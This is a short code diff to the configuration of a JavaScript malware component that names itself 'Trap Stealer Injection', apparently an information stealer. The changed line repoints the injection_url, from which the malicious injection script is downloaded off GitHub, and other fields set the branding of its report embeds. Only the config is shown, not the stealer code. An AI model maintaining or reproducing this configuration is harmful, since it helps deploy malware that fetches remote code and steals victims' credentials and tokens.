@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Trap Stealer Injection', 
   embed_icon: 'https://w0.peakpx.com/wallpaper/674/27/HD-wallpaper-felix-argyle-anime-re-zero-thumbnail.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/inj.js', 
+  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js', 
   /**
    
    **/
